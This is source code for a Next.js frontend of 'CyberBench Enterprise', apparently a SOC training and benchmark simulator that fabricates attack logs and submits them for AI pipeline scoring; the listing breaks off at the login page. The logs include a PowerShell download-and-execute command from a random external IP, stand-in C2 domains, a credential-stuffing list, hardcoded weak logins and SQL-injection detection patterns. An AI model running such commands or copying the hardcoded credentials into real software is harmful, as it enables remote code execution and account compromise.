# web/ — Next.js Frontend

## Folder Structure

```
web/
├── eslint.config.mjs
├── next-env.d.ts
├── next.config.ts
├── package.json
├── postcss.config.mjs
├── tsconfig.json
├── public/
└── src/
    ├── constants.ts
    ├── types.ts
    ├── app/
    │   ├── globals.css
    │   ├── layout.tsx
    │   ├── page.tsx
    │   ├── dashboard/
    │   │   └── page.tsx
    │   ├── documents/
    │   │   └── page.tsx
    │   ├── network/
    │   │   └── page.tsx
    │   ├── search/
    │   │   └── page.tsx
    │   └── upload/
    │       └── page.tsx
    ├── components/
    │   ├── AgentPipeline.tsx
    │   ├── AppShell.tsx
    │   ├── BackBtn.tsx
    │   ├── DashboardPage.tsx
    │   ├── DocumentsPage.tsx
    │   ├── Header.tsx
    │   ├── LoginPage.tsx
    │   ├── LogPanel.tsx
    │   ├── LogRow.tsx
    │   ├── NetworkPage.tsx
    │   ├── PipelineInspector.tsx
    │   ├── ResultsModal.tsx
    │   ├── ScoreBar.tsx
    │   ├── SearchPage.tsx
    │   └── UploadPage.tsx
    └── context/
        └── AppContext.tsx
```

---

## Config Files

### `package.json`

```json
{
  "name": "web",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "eslint"
  },
  "dependencies": {
    "lucide-react": "^1.11.0",
    "next": "16.2.4",
    "react": "19.2.4",
    "react-dom": "19.2.4"
  },
  "devDependencies": {
    "@tailwindcss/postcss": "^4",
    "@types/node": "^20",
    "@types/react": "^19",
    "@types/react-dom": "^19",
    "eslint": "^9",
    "eslint-config-next": "16.2.4",
    "tailwindcss": "^4",
    "typescript": "^5"
  }
}
```

### `next.config.ts`

```typescript
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  /* config options here */
};

export default nextConfig;
```

### `tsconfig.json`

```json
{
  "compilerOptions": {
    "target": "ES2017",
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "react-jsx",
    "incremental": true,
    "plugins": [{ "name": "next" }],
    "paths": { "@/*": ["./src/*"] }
  },
  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts", ".next/dev/types/**/*.ts"],
  "exclude": ["node_modules"]
}
```

### `postcss.config.mjs`

```javascript
const config = {
  plugins: {
    "@tailwindcss/postcss": {},
  },
};

export default config;
```

### `eslint.config.mjs`

```javascript
import { defineConfig, globalIgnores } from "eslint/config";
import nextVitals from "eslint-config-next/core-web-vitals";
import nextTs from "eslint-config-next/typescript";

const eslintConfig = defineConfig([
  ...nextVitals,
  ...nextTs,
  globalIgnores([".next/**", "out/**", "build/**", "next-env.d.ts"]),
]);

export default eslintConfig;
```

---

## `src/types.ts`

```typescript
export interface LogEntry {
  id: number;
  ts: string;
  tag: string;
  message: string;
  trigger?: boolean;
}

export interface AgentStatus {
  key: string;
  name: string;
  role: string;
  icon: string;
  status: "queued" | "running" | "done" | "failed";
  detail: string;
}

export interface RLFeedback {
  episode_id: number;
  shaped_reward: number;
  raw_overall: number;
  verdict: string;
  weakest_dimension: string;
  strongest_dimension: string;
  dimension_scores: Record<string, number>;
  streak: number;
  buffer_size: number;
  avg_score: number;
  pass_rate: number;
}

export interface RLStatus {
  status: string;
  episode: number;
  max_episodes: number;
  current_score: number;
  buffer_size: number;
  avg_score: number;
  pass_rate: number;
  score_trajectory: number[];
  dimension_averages: Record<string, number>;
  summary?: Record<string, unknown>;
  error?: string;
}

export interface PipelineResult {
  run_id: string;
  status: "running" | "completed" | "failed";
  stage?: string;
  agents?: AgentStatus[];
  scores?: {
    overall: number;
    algorithmic_total: number;
    technique_match: number;
    ioc_match: number;
    action_match: number;
    root_cause_match: number;
    blast_radius_match: number;
    completeness: number;
    qualitative_total: number;
    reasoning_quality: number;
    actionability: number;
    technical_depth: number;
  };
  verdict?: string;
  strengths?: string;
  gaps?: string;
  recommendation?: string;
  agent_confidence?: Record<string, string>;
  processing_times_ms?: Record<string, number>;
  rl_feedback?: RLFeedback;
}

export interface DocEntry {
  id: number;
  name: string;
  size: string;
  type: string;
  sens: string;
}

export type PipelineRun = {
  id: string;
  type: string;
  detail: string;
  meta: Record<string, unknown>;
  startedAt: number;
};
```

---

## `src/constants.ts`

```typescript
import type { DocEntry } from "./types";

export const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8000";

export const VALID_USERS: Record<string, string> = {
  admin: "admin123",
  jsmith: "password",
  alice: "qwerty",
};

export const INTERNAL_HOSTS = [
  "DC01.corp.local", "WEB02.corp.local", "APP03.corp.local",
  "DB04.corp.local", "FILE05.corp.local",
];

export const VPN_GATEWAYS = [
  "vpn-us-east.corp.com", "vpn-eu-west.corp.com", "vpn-apac.corp.com",
];

export const C2_DOMAINS = [
  "update-cdn.sys-telemetry.ru", "beacon.d1wnld.top", "svc-api.telemetry-cdn.cn",
];

export const CRED_LIST: [string, string][] = [
  ["admin", "wrongpass"], ["administrator", "123456"], ["admin", "password"],
  ["root", "toor"], ["admin", "admin"],
];

export const DOCS: DocEntry[] = [
  { id: 1, name: "Q3_Financial_Report.xlsx", size: "2.4 MB", type: "spreadsheet", sens: "CONFIDENTIAL" },
  { id: 2, name: "Employee_Directory_2024.csv", size: "890 KB", type: "csv", sens: "INTERNAL" },
  { id: 3, name: "Product_Roadmap_v2.pdf", size: "4.1 MB", type: "pdf", sens: "RESTRICTED" },
  { id: 4, name: "Customer_Data_Export.json", size: "12.3 MB", type: "json", sens: "CONFIDENTIAL" },
  { id: 5, name: "Security_Audit_2023.docx", size: "1.1 MB", type: "doc", sens: "RESTRICTED" },
  { id: 6, name: "HR_Policy_Manual.pdf", size: "3.2 MB", type: "pdf", sens: "INTERNAL" },
  { id: 7, name: "Source_Code_Backup.zip", size: "45.7 MB", type: "zip", sens: "CRITICAL" },
  { id: 8, name: "API_Keys_Production.env", size: "2 KB", type: "env", sens: "CRITICAL" },
];

export const SQL_PATTERNS = [
  /'\s*OR\s*'?1'?\s*=\s*'?1/i, /UNION\s+SELECT/i, /--/, /DROP\s+TABLE/i,
  /;\s*SELECT/i, /xp_cmdshell/i, /EXEC\s*\(/i, /INSERT\s+INTO/i, /DELETE\s+FROM/i,
];

export const ri = (a: number, b: number) => Math.floor(Math.random() * (b - a + 1)) + a;
export const rIP = () => `${ri(10, 192)}.${ri(0, 255)}.${ri(0, 255)}.${ri(1, 254)}`;
export const b64 = (s: string) => btoa(s);

const TAG_COLORS: Record<string, string> = {
  AUTH_FAIL: "#ef4444", AUTH_SUCCESS: "#22c55e", BRUTE_FORCE: "#ef4444",
  CRED_STUFFING: "#ef4444", VPN_AUTH: "#f97316", VPN_AUTH_FAIL: "#ef4444",
  LATERAL_MOVE: "#f97316", LDAP_QUERY: "#f97316", FILE_ACCESS: "#6b7280",
  BULK_COPY: "#f97316", LARGE_UPLOAD: "#ef4444",
  PROCESS_SPAWN: "#ef4444", SCHED_TASK: "#f97316", REG_WRITE: "#f97316",
  DNS_BEACON: "#ef4444", NET_CONN: "#f97316",
  SQLI_ATTEMPT: "#f97316", DB_EXFIL: "#ef4444",
  TRIGGER: "#facc15", SYSTEM: "#3b82f6", PAGE_ACCESS: "#475569",
  USER_LOGIN: "#22c55e", SEARCH: "#475569",
};

export const tagColor = (t: string) => {
  for (const [k, v] of Object.entries(TAG_COLORS)) if (t.includes(k)) return v;
  return "#475569";
};
```

---

## `src/app/globals.css`

```css
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
@import "tailwindcss";

:root {
  --background: 222 47% 4%;
  --foreground: 215 20% 88%;
  --card: 222 40% 9%;
  --card-foreground: 215 20% 88%;
  --surface-elevated: 222 35% 12%;
  --surface-glass: 222 47% 11%;
  --primary: 221 83% 53%;
  --primary-foreground: 0 0% 100%;
  --primary-hover: 217 91% 60%;
  --primary-glow: 217 91% 60%;
  --secondary: 217 33% 17%;
  --muted: 217 33% 14%;
  --muted-foreground: 215 16% 57%;
  --destructive: 0 84% 60%;
  --success: 142 71% 45%;
  --warning: 25 95% 53%;
  --purple: 262 83% 58%;
  --border: 215 20% 25% / 0.3;
  --ring: 217 91% 60%;
  --radius: 0.75rem;
  --gradient-glass: linear-gradient(135deg, hsl(222 47% 11% / 0.7), hsl(222 50% 8% / 0.9));
  --gradient-bg: radial-gradient(ellipse 80% 50% at 50% -20%, hsl(217 91% 60% / 0.08), transparent),
                 radial-gradient(ellipse 60% 40% at 80% 100%, hsl(262 83% 58% / 0.05), transparent);
  --glow-blue: 0 0 24px hsl(217 91% 60% / 0.25), inset 0 1px 0 hsl(217 91% 60% / 0.1);
  --glow-red: 0 0 24px hsl(0 84% 60% / 0.25), inset 0 1px 0 hsl(0 84% 60% / 0.1);
  --glow-green: 0 0 24px hsl(142 71% 45% / 0.25), inset 0 1px 0 hsl(142 71% 45% / 0.1);
  --glow-purple: 0 0 24px hsl(262 83% 58% / 0.25), inset 0 1px 0 hsl(262 83% 58% / 0.1);
  --transition-smooth: 200ms cubic-bezier(0.4, 0, 0.2, 1);
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  background: hsl(var(--background));
  color: hsl(var(--foreground));
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  background-image: var(--gradient-bg);
  background-attachment: fixed;
  min-height: 100vh;
}

::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: hsl(217 33% 17%); border-radius: 99px; }
::-webkit-scrollbar-thumb:hover { background: hsl(217 33% 25%); }

input:focus, textarea:focus { outline: none; border-color: hsl(var(--primary-glow)) !important; box-shadow: 0 0 0 3px hsl(217 91% 60% / 0.15) !important; }

button { transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
button:hover { opacity: 0.9; }
button:active { transform: scale(0.98); }

.glass-card {
  background: var(--gradient-glass);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid hsl(215 20% 60% / 0.08);
  transition: var(--transition-smooth);
}
.glass-card:hover {
  border-color: hsl(215 20% 60% / 0.18);
  box-shadow: 0 4px 24px hsl(0 0% 0% / 0.3);
}

.glow-blue { box-shadow: var(--glow-blue); }
.glow-red { box-shadow: var(--glow-red); }
.glow-green { box-shadow: var(--glow-green); }
.glow-purple { box-shadow: var(--glow-purple); }

.frosted-nav {
  background: hsl(222 47% 6% / 0.75);
  backdrop-filter: saturate(180%) blur(20px);
  -webkit-backdrop-filter: saturate(180%) blur(20px);
  border-bottom: 1px solid hsl(215 20% 60% / 0.08);
}

.btn-primary {
  background: linear-gradient(135deg, #2563eb, #1d4ed8);
  box-shadow: 0 2px 8px rgba(37, 99, 235, 0.3);
  transition: all 0.2s ease;
}
.btn-primary:hover {
  background: linear-gradient(135deg, #3b82f6, #2563eb);
  box-shadow: 0 4px 16px rgba(37, 99, 235, 0.4);
  opacity: 1 !important;
}

.btn-danger {
  background: linear-gradient(135deg, #dc2626, #b91c1c);
  box-shadow: 0 2px 8px rgba(220, 38, 38, 0.3);
}
.btn-danger:hover {
  background: linear-gradient(135deg, #ef4444, #dc2626);
  box-shadow: 0 4px 16px rgba(220, 38, 38, 0.4);
  opacity: 1 !important;
}

.btn-purple {
  background: linear-gradient(135deg, #7c3aed, #6d28d9);
  box-shadow: 0 2px 8px rgba(124, 58, 237, 0.3);
}
.btn-purple:hover {
  background: linear-gradient(135deg, #8b5cf6, #7c3aed);
  box-shadow: 0 4px 16px rgba(124, 58, 237, 0.4);
  opacity: 1 !important;
}

.font-code { font-family: 'JetBrains Mono', 'Courier New', monospace; }

.divider {
  height: 1px;
  background: linear-gradient(90deg, transparent, rgba(148, 163, 184, 0.1), transparent);
}

@keyframes fadeIn { from { opacity: 0; transform: translateX(-4px); } to { opacity: 1; transform: translateX(0); } }
@keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
@keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-7px); } 40% { transform: translateX(7px); } 60% { transform: translateX(-4px); } 80% { transform: translateX(4px); } }
@keyframes pulse-glow { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
@keyframes slide-in { from { opacity: 0; transform: translateY(20px) scale(0.97); } to { opacity: 1; transform: translateY(0) scale(1); } }

.animate-fadeIn { animation: fadeIn 0.15s ease forwards; }
.animate-fadeUp { animation: fadeUp 0.35s cubic-bezier(0.4, 0, 0.2, 1) forwards; }
.animate-shake { animation: shake 0.4s ease; }
.animate-slide-in { animation: slide-in 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }

@keyframes progress-indeterminate {
  0% { width: 10%; margin-left: 0%; }
  50% { width: 40%; margin-left: 30%; }
  100% { width: 10%; margin-left: 90%; }
}

@keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
.blink { animation: blink 1.2s ease-in-out infinite; }

.text-gradient-primary {
  background: linear-gradient(135deg, hsl(217 91% 70%), hsl(262 83% 70%));
  -webkit-background-clip: text;
  background-clip: text;
  color: transparent;
}
```

---

## `src/app/layout.tsx`

```tsx
import type { Metadata } from "next";
import "./globals.css";
import { AppProvider } from "@/context/AppContext";
import { AppShell } from "@/components/AppShell";

export const metadata: Metadata = {
  title: "CyberBench Enterprise",
  description: "Enterprise Workspace Security Simulation Platform",
};

export default function RootLayout({
  children,
}: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="en" className="h-full">
      <body className="h-full bg-[#030712] text-[#e2e8f0] antialiased">
        <AppProvider>
          <AppShell>{children}</AppShell>
        </AppProvider>
      </body>
    </html>
  );
}
```

---

## Route Pages

### `src/app/page.tsx`

```tsx
import { LoginPage } from "@/components/LoginPage";
export default function Page() { return <LoginPage />; }
```

### `src/app/dashboard/page.tsx`

```tsx
import { DashboardPage } from "@/components/DashboardPage";
export default function Page() { return <DashboardPage />; }
```

### `src/app/search/page.tsx`

```tsx
import { SearchPage } from "@/components/SearchPage";
export default function Page() { return <SearchPage />; }
```

### `src/app/documents/page.tsx`

```tsx
import { DocumentsPage } from "@/components/DocumentsPage";
export default function Page() { return <DocumentsPage />; }
```

### `src/app/upload/page.tsx`

```tsx
import { UploadPage } from "@/components/UploadPage";
export default function Page() { return <UploadPage />; }
```

### `src/app/network/page.tsx`

```tsx
import { NetworkPage } from "@/components/NetworkPage";
export default function Page() { return <NetworkPage />; }
```

---

## `src/context/AppContext.tsx`

```tsx
"use client";

import {
  createContext, useContext, useState, useRef, useCallback, useEffect,
  type ReactNode,
} from "react";
import { useRouter } from "next/navigation";
import {
  API_BASE, VALID_USERS, INTERNAL_HOSTS, VPN_GATEWAYS, C2_DOMAINS,
  CRED_LIST, DOCS, SQL_PATTERNS, ri, rIP, b64,
} from "@/constants";
import type { LogEntry, PipelineResult, DocEntry, AgentStatus, PipelineRun } from "@/types";

interface AppContextType {
  logs: LogEntry[];
  user: string | null;
  loginAttempts: number;
  credIdx: number;
  lateralStep: number;
  pipelineRunning: boolean;
  pipelineStage: string;
  pipelineResult: PipelineResult | null;
  pipelineAgents: AgentStatus[];
  activeRun: PipelineRun | null;
  setActiveRun: (run: PipelineRun | null) => void;
  showResults: boolean;
  setShowResults: (v: boolean) => void;
  docs: DocEntry[];
  addLog: (tag: string, message: string, extra?: Partial<LogEntry>) => void;
  navigate: (page: string) => void;
  handleLogin: (username: string, password: string) => void;
  handleCredStuffing: () => void;
  handleVPN: (succeed: boolean) => void;
  handleLateralMove: () => void;
  handleFileAccess: (doc: DocEntry) => void;
  handleRunScript: (filename: string) => void;
  handleC2Beacon: () => void;
  handleSearch: (query: string) => void;
  signOut: () => void;
}

const AppContext = createContext<AppContextType | null>(null);

export function useApp() {
  const ctx = useContext(AppContext);
  if (!ctx) throw new Error("useApp must be used within AppProvider");
  return ctx;
}

export function AppProvider({ children }: { children: ReactNode }) {
  const router = useRouter();
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [user, setUser] = useState<string | null>(null);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [credIdx, setCredIdx] = useState(0);
  const [lateralStep, setLateralStep] = useState(0);
  const firedTriggers = useRef(new Set<string>());
  const [fileAccessLog, setFileAccessLog] = useState<number[]>([]);
  const sessionIP = useRef(rIP());

  const [pipelineRunning, setPipelineRunning] = useState(false);
  const [pipelineStage, setPipelineStage] = useState("");
  const [pipelineResult, setPipelineResult] = useState<PipelineResult | null>(null);
  const [pipelineAgents, setPipelineAgents] = useState<AgentStatus[]>([]);
  const [activeRun, setActiveRun] = useState<PipelineRun | null>(null);
  const [showResults, setShowResults] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const addLog = useCallback((tag: string, message: string, extra: Partial<LogEntry> = {}) => {
    const ts = new Date().toTimeString().slice(0, 8);
    setLogs((prev) => [...prev, { id: Date.now() + Math.random(), ts, tag, message, ...extra }]);
  }, []);

  const startPolling = useCallback(
    (runId: string) => {
      if (pollRef.current) clearInterval(pollRef.current);
      pollRef.current = setInterval(async () => {
        try {
          const r = await fetch(`${API_BASE}/api/pipeline/results/${runId}`);
          const data: PipelineResult = await r.json();
          setPipelineStage(data.stage || "Processing...");
          if (data.agents) setPipelineAgents(data.agents);
          if (data.status === "completed") {
            if (pollRef.current) clearInterval(pollRef.current);
            setPipelineRunning(false);
            setPipelineResult(data);
            setShowResults(true);
            const score = data.scores?.overall ?? 0;
            addLog("SYSTEM", `[PIPELINE] Analysis complete — Score: ${score}/100 — Verdict: ${data.verdict}`);
          } else if (data.status === "failed") {
            if (pollRef.current) clearInterval(pollRef.current);
            setPipelineRunning(false);
            setPipelineAgents(data.agents || []);
            addLog("SYSTEM", `[PIPELINE] Analysis failed — check server logs`);
          }
        } catch { /* keep polling */ }
      }, 2000);
    },
    [addLog],
  );

  const triggerPipeline = useCallback(
    (type: string, detail: string, meta: Record<string, unknown> = {}) => {
      if (firedTriggers.current.has(type)) return;
      firedTriggers.current.add(type);
      addLog("TRIGGER", `⚠  ${type} detected → pipeline initiated`, { trigger: true });
      setPipelineRunning(true);
      setPipelineStage("Submitting logs to pipeline...");
      setActiveRun({ id: crypto.randomUUID(), type, detail, meta, startedAt: Date.now() });

      setTimeout(() => {
        setLogs((currentLogs) => {
          const logsToSend = currentLogs.map((l) => ({
            ts: l.ts, tag: l.tag, message: l.message, trigger: l.trigger || false,
          }));
          fetch(`${API_BASE}/api/pipeline/trigger`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ trigger_type: type, detail, meta, logs: logsToSend, session_ip: sessionIP.current }),
          })
            .then((r) => r.json())
            .then((data) => {
              if (data.run_id) {
                addLog("SYSTEM", `[PIPELINE] ${type} → queued for SOC analysis (run: ${data.run_id.slice(0, 8)})`);
                startPolling(data.run_id);
              }
            })
            .catch(() => {
              addLog("SYSTEM", `[PIPELINE] ${type} → failed to connect to analysis backend`);
              setPipelineRunning(false);
            });
          return currentLogs;
        });
      }, 200);
    },
    [addLog, startPolling],
  );

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
  useEffect(() => {
    addLog("SYSTEM", "CyberBench Enterprise Workspace initialised");
    addLog("SYSTEM", `Session origin: ${sessionIP.current}`);
  }, []);

  const navigate = useCallback(
    (page: string) => {
      addLog("PAGE_ACCESS", `User '${user}' navigated to /${page} [${sessionIP.current}]`);
      router.push(`/${page === "login" ? "" : page}`);
    },
    [addLog, user, router],
  );

  const signOut = useCallback(() => {
    addLog("SYSTEM", `User '${user}' signed out`);
    setUser(null);
    setLoginAttempts(0);
    setCredIdx(0);
    firedTriggers.current = new Set();
    router.push("/");
  }, [addLog, user, router]);

  /* ── ATTACK 1 — LOGIN ── */
  const handleLogin = useCallback(
    (username: string, password: string) => {
      const ip = sessionIP.current;
      if (VALID_USERS[username] && VALID_USERS[username] === password) {
        addLog("AUTH_SUCCESS", `Authentication succeeded for '${username}' from ${ip}`);
        setLoginAttempts(0); setCredIdx(0); setUser(username);
        setTimeout(() => {
          addLog("USER_LOGIN", `Session granted — '${username}' entered workspace`);
          router.push("/dashboard");
        }, 400);
      } else {
        const n = loginAttempts + 1;
        setLoginAttempts(n);
        addLog("AUTH_FAIL", `Login failed for '${username}' from ${ip} [attempt ${n}]`);
        if (n >= 3) {
          addLog("BRUTE_FORCE", `Repeated failures from ${ip} — brute-force threshold reached`);
          triggerPipeline("BRUTE_FORCE", "High-frequency failed auth from single source", { ip });
        }
      }
    },
    [addLog, loginAttempts, triggerPipeline, router],
  );

  const handleCredStuffing = useCallback(() => {
    const [u, p] = CRED_LIST[credIdx % CRED_LIST.length];
    const ip = rIP();
    addLog("CRED_STUFFING", `Stuffed credential pair ${credIdx + 1}/5: '${u}':'${p}' from ${ip}`);
    setCredIdx((i) => i + 1);
    if (credIdx + 1 >= 3) {
      setTimeout(() => triggerPipeline("CRED_STUFFING", "Breached credential pairs detected across multiple IPs", { pairs: credIdx + 1 }), 300);
    }
  }, [addLog, credIdx, triggerPipeline]);

  const handleVPN = useCallback(
    (succeed: boolean) => {
      const gw = VPN_GATEWAYS[ri(0, 2)];
      const ip = rIP();
      if (succeed) {
        addLog("VPN_AUTH", `VPN session established via ${gw} from external IP ${ip}`);
        addLog("USER_LOGIN", `Post-VPN workspace access: '${user || "unknown"}' from ${ip}`);
      } else {
        addLog("VPN_AUTH_FAIL", `VPN auth failed at ${gw} from ${ip} — invalid certificate`);
        triggerPipeline("VPN_BRUTE", "Failed VPN authentication — possible credential probing", { gw, ip });
      }
    },
    [addLog, user, triggerPipeline],
  );

  /* ── ATTACK 2 — LATERAL MOVEMENT ── */
  const handleLateralMove = useCallback(() => {
    const src = INTERNAL_HOSTS[lateralStep % INTERNAL_HOSTS.length];
    const dst = INTERNAL_HOSTS[(lateralStep + 1) % INTERNAL_HOSTS.length];
    const ip = rIP();
    setLateralStep((s) => s + 1);
    addLog("LATERAL_MOVE", `SMB/WMI pivot: ${src} → ${dst} using service account [${ip}]`);
    setTimeout(() => addLog("LDAP_QUERY", `LDAP: (&(objectClass=user)(memberOf=CN=Domain Admins,DC=corp,DC=local)) on ${dst}`), 350);
    setTimeout(() => addLog("LDAP_QUERY", `LDAP: Enumerated ${ri(12, 80)} user accounts on ${dst}`), 700);
    if (lateralStep >= 2) {
      setTimeout(() => triggerPipeline("LATERAL_MOVEMENT", "Service account pivoting across ≥3 hosts", { hops: lateralStep + 1 }), 900);
    }
  }, [addLog, lateralStep, triggerPipeline]);

  /* ── ATTACK 3 — DATA THEFT ── */
  const handleFileAccess = useCallback(
    (doc: DocEntry) => {
      addLog("FILE_ACCESS", `Opened: ${doc.name} [${doc.sens}] by '${user}'`);
      const now = Date.now();
      const recent = [...fileAccessLog, now].filter((t) => now - t < 10000);
      setFileAccessLog(recent);
      if (recent.length >= 4) {
        const totalMB = (recent.length * ri(8, 20)).toFixed(1);
        addLog("BULK_COPY", `${recent.length} files staged to clipboard/temp — ${totalMB} MB total`);
        setTimeout(() => {
          const extIP = `185.${ri(100, 220)}.${ri(1, 255)}.${ri(1, 254)}`;
          addLog("LARGE_UPLOAD", `Outbound HTTPS transfer: ${totalMB} MB → ${extIP}:443`);
          triggerPipeline("DATA_EXFILTRATION", "Bulk file access followed by large outbound transfer", { files: recent.length, mb: totalMB });
        }, 900);
      }
    },
    [addLog, user, fileAccessLog, triggerPipeline],
  );

  /* ── ATTACK 4 — MALWARE / PERSISTENCE ── */
  const handleRunScript = useCallback(
    (filename: string) => {
      const extIP = `185.${ri(100, 220)}.${ri(1, 255)}.${ri(1, 254)}`;
      const cmd = `IEX(New-Object Net.WebClient).DownloadString('http://${extIP}/stage2.ps1')`;
      const enc = b64(cmd).slice(0, 48) + "...";
      addLog("PROCESS_SPAWN", `cmd.exe → powershell.exe -NoP -NonI -W Hidden -Enc ${enc}  [parent: ${filename}]`);
      setTimeout(() => addLog("PROCESS_SPAWN", `Decoded payload: ${cmd.slice(0, 70)}...`), 500);
      setTimeout(() => addLog("SCHED_TASK", `New scheduled task registered: "WindowsUpdateHelper" — runs at logon, every 30 min`), 1000);
      setTimeout(() => {
        addLog("REG_WRITE", `Registry write: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run  →  "C:\\ProgramData\\svchost_update.exe"`);
        triggerPipeline("MALWARE_PERSISTENCE", "PowerShell dropper + scheduled task + registry run key", { file: filename });
      }, 1600);
    },
    [addLog, triggerPipeline],
  );

  /* ── ATTACK 5 — C2 ── */
  const handleC2Beacon = useCallback(() => {
    const domain = C2_DOMAINS[ri(0, 2)];
    const extIP = `185.${ri(100, 220)}.${ri(1, 255)}.${ri(1, 254)}`;
    addLog("DNS_BEACON", `Suspicious DNS query: ${domain} → resolved ${extIP} (Tor exit / bulletproof ASN)`);
    setTimeout(() => addLog("NET_CONN", `TCP keep-alive: ${extIP}:443  interval: ${ri(28, 90)}s  payload: ${ri(80, 240)}B (encrypted)`), 500);
    setTimeout(() => {
      addLog("NET_CONN", `Outbound traffic spike: ${(ri(15, 80) / 10).toFixed(1)} MB → ${extIP}  protocol: HTTPS`);
      triggerPipeline("C2_COMMUNICATION", "Periodic DNS beacon + encrypted outbound to threat-actor ASN", { domain, extIP });
    }, 1000);
  }, [addLog, triggerPipeline]);

  /* ── ATTACK 6 — SQL INJECTION ── */
  const handleSearch = useCallback(
    (query: string) => {
      const isSqli = SQL_PATTERNS.some((p) => p.test(query));
      if (isSqli) {
        addLog("SQLI_ATTEMPT", `Injection payload in search: "${query.slice(0, 60)}" from ${sessionIP.current}`);
        setTimeout(() => addLog("SQLI_ATTEMPT", `DB error triggered — blind probe on table 'users' (column count: ${ri(4, 12)})`), 350);
        setTimeout(() => {
          const rows = ri(200, 8000);
          addLog("DB_EXFIL", `${rows} rows extracted via UNION SELECT — tables: users, sessions, api_keys`);
          triggerPipeline("WEB_SQL_INJECTION", "SQL injection → successful DB row extraction", { endpoint: "/api/search", rows });
        }, 800);
      } else {
        addLog("SEARCH", `Search: "${query.slice(0, 40)}" by '${user}'`);
      }
    },
    [addLog, user, triggerPipeline],
  );

  return (
    <AppContext.Provider
      value={{
        logs, user, loginAttempts, credIdx, lateralStep,
        pipelineRunning, pipelineStage, pipelineResult, pipelineAgents, activeRun, setActiveRun, showResults, setShowResults,
        docs: DOCS, addLog, navigate,
        handleLogin, handleCredStuffing, handleVPN,
        handleLateralMove, handleFileAccess, handleRunScript, handleC2Beacon, handleSearch,
        signOut,
      }}
    >
      {children}
    </AppContext.Provider>
  );
}
```

---

## `src/components/AppShell.tsx`

```tsx
"use client";

import { type ReactNode } from "react";
import { useApp } from "@/context/AppContext";
import { Header } from "./Header";
import { LogPanel } from "./LogPanel";
import { ResultsModal } from "./ResultsModal";
import { AgentPipeline } from "./AgentPipeline";
import { PipelineInspector } from "./PipelineInspector";

export function AppShell({ children }: { children: ReactNode }) {
  const { showResults, pipelineResult, setShowResults, activeRun, setActiveRun } = useApp();

  return (
    <div className="flex flex-col h-screen overflow-hidden">
      <Header />
      <div className="flex flex-1 overflow-hidden">
        <div className="w-[68%] border-r border-[#ffffff06] overflow-y-auto">
          {children}
        </div>
        <LogPanel />
      </div>
      <AgentPipeline />
      <PipelineInspector run={activeRun} onClose={() => setActiveRun(null)} />
      {showResults && pipelineResult && (
        <ResultsModal result={pipelineResult} onClose={() => setShowResults(false)} />
      )}
    </div>
  );
}
```

---

## `src/components/Header.tsx`

```tsx
"use client";

import { useApp } from "@/context/AppContext";

export function Header() {
  const { user, pipelineRunning, pipelineAgents, signOut } = useApp();
  const runningAgent = pipelineAgents.find((a) => a.status === "running");
  const doneCount = pipelineAgents.filter((a) => a.status === "done").length;

  return (
    <div className="flex items-center justify-between px-6 py-3.5 border-b border-[#ffffff08] bg-[#0a0f1e]/80 backdrop-blur-xl shrink-0">
      <div className="flex items-center gap-3">
        <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[#3b82f6] to-[#6366f1] flex items-center justify-center text-white text-sm font-bold shadow-lg shadow-blue-500/20">C</div>
        <div>
          <span className="text-[15px] font-semibold tracking-tight text-[#f0f6ff]">CyberBench</span>
          <span className="ml-2 text-[9px] px-2 py-0.5 rounded-full bg-blue-500/10 text-[#60a5fa] border border-blue-500/20 font-medium tracking-wider uppercase">Enterprise</span>
        </div>
      </div>
      {user && (
        <div className="flex items-center gap-4">
          {pipelineRunning && (
            <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20">
              <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" />
              <span className="text-[10px] text-blue-400 font-medium">
                {runningAgent ? `${runningAgent.icon} ${runningAgent.name}` : "Initializing..."}{" "}
                <span className="text-blue-400/60">({doneCount}/{pipelineAgents.length})</span>
              </span>
            </div>
          )}
          <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-[#ffffff05] border border-[#ffffff08]">
            <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-sm shadow-emerald-400/50" />
            <span className="text-xs text-[#94a3b8] font-medium">{user}</span>
          </div>
          <button className="text-[11px] px-3.5 py-1.5 border border-[#ffffff10] text-[#64748b] rounded-lg hover:text-[#94a3b8] hover:border-[#ffffff20] hover:bg-[#ffffff05]" onClick={signOut}>Sign out</button>
        </div>
      )}
    </div>
  );
}
```

---

## `src/components/LoginPage.tsx`

```tsx
"use client";

import { useState, useEffect, useRef } from "react";
import { useApp } from "@/context/AppContext";

export function LoginPage() {
